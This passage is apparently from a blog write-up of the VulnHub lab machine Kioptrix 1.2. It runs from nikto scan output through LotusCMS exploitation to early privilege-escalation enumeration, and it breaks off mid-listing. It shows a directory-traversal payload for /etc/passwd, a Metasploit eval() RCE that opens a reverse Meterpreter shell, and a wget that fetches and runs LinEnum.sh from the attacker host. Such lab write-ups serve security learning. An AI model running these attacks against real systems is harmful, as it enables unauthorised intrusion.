+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ Apache/2.2.8 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.2.34 is the EOL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the 2.x branch.
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least 7.2.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7680 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 19 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2020-07-28 22:59:13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s quickly take a look at those PHP file discosures:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
/?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
/?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
/?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I was too lazy to take screenshots of each, but all you need to know is that each of these reveals some PHP pics and credits, but nothing crazy. We now know that PHP is running, but we could infer that anyway from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP/5.2.4-2ubuntu5.6&lt;/code&gt; header.&lt;/p&gt;

&lt;p&gt;Okay, next up is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/phpmyadmin/&lt;/code&gt; finding, let’s take a look:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_7.PNG&quot; alt=&quot;/phpmyadmin/&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another login page…&lt;/p&gt;

&lt;p&gt;Also, if we browse &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/phpmyadmin/changelog.php&lt;/code&gt; we can see that the most recent changelog entry is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.11.3.0 (2007-12-08)&lt;/code&gt;… Intersting.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;Okay, so at this point we have a couple curious things to continue to check out:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The login page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php?system=Admin&lt;/code&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LotusCMS&lt;/code&gt; application.&lt;/li&gt;
  &lt;li&gt;The login page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/gallery/gadmin&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/phpmyadmin/&lt;/code&gt; login page and PHP version&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s start from the top. I tried some common creds on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LotusCMS&lt;/code&gt; page, but no success… Let’s do some research to see if there are exploits tied to LotusCMS.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.2:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit lotusCMS
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
 Exploit Title                                                           |  Path                                  
                                                                         | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
LotusCMS 3.0 - &lt;span class=&quot;s1&quot;&gt;'eval()'&lt;/span&gt; Remote Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            | exploits/php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                | exploits/php/webapps/16982.txt
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
Shellcodes: No Result                                                                                             
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh wow, maybe one of these works… Let’s take a look at the second item on the list:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/exploitdb/exploits/php/webapps/16982.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I went ahead and followed the link to &lt;a href=&quot;https://www.immuniweb.com/advisory/HTB22883&quot;&gt;this disclosure&lt;/a&gt;. There’s quite a bit here, most of which requires authentication, but let’s focus on the last item:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Directory traversal vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;LotusCMS
The vulnerability exists due to insufficient validation of input data &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the &lt;span class=&quot;s2&quot;&gt;&quot;page&quot;&lt;/span&gt; parameter &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;core/model/PageModel.php. A remote attacker can create a specially crafted HTTP request containing directory traversal sequences with NULL byte and &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;arbitrary files on the target system.
Exploitation example:
http://host/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./../../../../../etc/passwd%00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm! Let’s give it a shot.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_8.PNG&quot; alt=&quot;Trying to get an LFI&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No luck.. There’s also that first result which is a MetaSploit module. Let’s fire up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; real quick and try it out.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/http/lcms_php_exec 
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/http/lcms_php_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; info

       Name: LotusCMS 3.0 &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; Remote Command Execution
     Module: exploit/multi/http/lcms_php_exec
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BSD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
       Rank: Excellent
  Disclosed: 2011-03-03

Provided by:
  dflah_ &amp;lt;dflah_@alligatorteam.org&amp;gt;
  sherl0ck_ &amp;lt;sherl0ck_@alligatorteam.org&amp;gt;
  sinn3r &amp;lt;sinn3r@metasploit.com&amp;gt;

Available targets:
  Id  Name
  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
  0   Automatic LotusCMS 3.0

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
  Proxies                   no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
  RHOSTS                    &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
  RPORT    80               &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  SSL      &lt;span class=&quot;nb&quot;&gt;false            &lt;/span&gt;no        Negotiate SSL/TLS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;outgoing connections
  URI      /lcms/           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;URI
  VHOST                     no        HTTP server virtual host

Payload information:
  Space: 4000
  Avoid: 1 characters

Description:
  This module exploits a vulnerability found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Lotus CMS 3.0&lt;span class=&quot;s1&quot;&gt;'s 
  Router() function. This is done by embedding PHP code in the '&lt;/span&gt;page&lt;span class=&quot;s1&quot;&gt;' 
  parameter, which will be passed to a eval call, therefore allowing 
  remote code execution. The module can either automatically pick up a 
  '&lt;/span&gt;page&lt;span class=&quot;s1&quot;&gt;' parameter from the default page, or manually specify one in 
  the URI option. To use the automatic method, please supply the URI 
  with just a directory path, for example: &quot;/lcms/&quot;. To manually 
  configure one, you may do: &quot;/lcms/somepath/index.php?page=index&quot;

References:
  https://cvedetails.com/cve/CVE-2011-0518/
  OSVDB (75095)
  http://secunia.com/secunia_research/2011-21/

msf5 exploit(multi/http/lcms_php_exec) &amp;gt; set URI /index.php
URI =&amp;gt; /index.php
msf5 exploit(multi/http/lcms_php_exec) &amp;gt; set RHOSTS 10.0.0.204
RHOSTS =&amp;gt; 10.0.0.204
msf5 exploit(multi/http/lcms_php_exec) &amp;gt; run

[*] Started reverse TCP handler on 10.0.0.168:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38288 bytes) to 10.0.0.204
[*] Meterpreter session 1 opened (10.0.0.168:4444 -&amp;gt; 10.0.0.204:46096) at 2020-07-28 23:31:50 -0400

meterpreter &amp;gt; getuid
Server username: www-data (33)
meterpreter &amp;gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We got a shell… idk though… I hate using MetaSploit &lt;em&gt;sometimes&lt;/em&gt; (not always). Let’s see if we can be elitist and find a manual exploit for this vuln, after all it’s from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2011&lt;/code&gt;. There’s bound to be one.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~~~Googling~~~&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Okay, 30 seconds later, and we found &lt;a href=&quot;https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh&quot;&gt;this&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cool, let’s try running it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.2:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./lotusRCE.sh 10.0.0.204 /index.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.2_9.PNG&quot; alt=&quot;Anti-script kiddie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we got a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;There &lt;em&gt;are&lt;/em&gt; the two other web login panels that we didn’t check out. These might be entry points, but let’s continue with our shell and see if there’s a path forward to root.&lt;/p&gt;

&lt;p&gt;Let’s get started by upgrading our shell to a full tty using Python:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;which python
/usr/bin/python
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty; pty.spawn('/bin/bash');&quot;&lt;/span&gt;
www-data@Kioptrix3:/home/www/kioptrix3.com&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool! We’ll go ahead and repeat the process from the &lt;a href=&quot;https://0xash.github.io/2020-07-28-Kioptrix-Level-1.1/&quot;&gt;last box&lt;/a&gt; and run LinEnum:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Kioptrix3:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which wget
which wget
/usr/bin/wget
www-data@Kioptrix3:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
www-data@Kioptrix3:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;lol
&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;lol
www-data@Kioptrix3:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;lol
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;lol
www-data@Kioptrix3:/tmp/lol&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.0.0.168/LinEnum.sh
wget http://10.0.0.168/LinEnum.sh
&lt;span class=&quot;nt&quot;&gt;--23&lt;/span&gt;:41:18--  http://10.0.0.168/LinEnum.sh
           &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;LinEnum.sh&lt;span class=&quot;s1&quot;&gt;'
Connecting to 10.0.0.168:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46,631 (46K) [text/x-sh]

 0% [                                     ] 0             --.--K/s         100%[====================================&amp;gt;] 46,631        --.--K/s             

23:41:18 (336.00 MB/s) - `LinEnum.sh'&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;46631/46631]

www-data@Kioptrix3:/tmp/lol&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x LinEnum.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./LinEnum.sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; lol.txt
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x LinEnum.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./LinEnum.sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; lol.txt
www-data@Kioptrix3:/tmp/lol&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 84
drwxr-xr-x 2 www-data www-data  4096 Jul 28 23:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxrwxrwt 5 root     root      4096 Jul 28 23:41 ..
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data 46631 Jul 28 23:40 LinEnum.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data 28137 Jul 28 23:41 lol.txt
www-data@Kioptrix3:/tmp/lol&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ll save you from the FTP commands getting the output file back to my host, anyways, let’s take a look at the interesting findings:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux Kioptrix3 2.6.24-24-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is really old… if we look at the rest of the output we can see some information on users that have logged onto the system:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Mon Apr 18 11:29:13 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; 2011
loneferret       pts/1    192.168.1.106    Sat Apr 16 08:51:58 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; 2011
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This confirms our assumption from the beginning that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loneferret&lt;/code&gt; was a valid user on the box. Cool.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Active Internet connections &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;only servers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -               
tcp6       0      0 :::80                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      4284/sh         
tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -               
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looks like MySQL is listening locally, might want to check this out later.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt; if we need to compile stuff. Let’s continue by checking off items from this list… Starting with the kernel verison:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~~~Googling~~~&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~~~Trying Exploits~~~&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I tried quite a few exploits, and ultimately decided to go down other avenues. I was running into dead ends, so decided to think from the beginning again…&lt;/p&gt;

&lt;p&gt;Let’s see, where did we get dropped upon getting a shell?&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/www/kioptrix3.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Wow, did we even see if we can access other home directories?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home
total 20
drwxr-xr-x  5 root       root       4096 Apr 16  2011 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 21 root       root       4096 Apr 11  2011 ..
drwxr-xr-x  2 dreg       dreg       4096 Apr 16  2011 dreg
drwxr-xr-x  3 loneferret loneferret 4096 Apr 17  2011 loneferret
drwxr-xr-x  3 root       root       4096 Apr 12  2011 www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Keep enumerating…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/loneferret
total 64
drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 loneferret &lt;span class=&quot;nb&quot;&gt;users         &lt;/span&gt;13 Apr 18  2011 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 loneferret loneferret   220 Apr 11  2011 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 loneferret loneferret  2940 Apr 11  2011 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root       root          15 Apr 15  2011 .nano_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 loneferret loneferret   586 Apr 11  2011 .profile
drwx------ 2 loneferret loneferret  4096 Apr 14  2011 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 loneferret loneferret     0 Apr 11  2011 .sudo_as_admin_successful
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root       root         224 Apr 16  2011 CompanyPolicy.README
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 root       root       26275 Jan 12  2011 checksec.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm… Okay, let’s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CompanyPolicy.README&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;editing, creating and viewing files.
Please use the &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sudo ht'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Failure to &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;so will result &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;you immediate termination.

DG
CEO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dang. Unfortunately we can’t sudo since we don’t know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;’s password.&lt;/p&gt;

&lt;p&gt;I think it’s time to enumerate more.&lt;/p&gt;

&lt;p&gt;Let’s look through the webapp files and see if we missed anything:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Kioptrix3:/home/www/kioptrix3.com&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 92
drwxr-xr-x  8 root root  4096 Apr 15  2011 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  3 root root  4096 Apr 12  2011 ..
drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
drwxrwxrwx  8 root root  4096 Apr 14  2011 core
drwxrwxrwx  8 root root  4096 Apr 14  2011 data
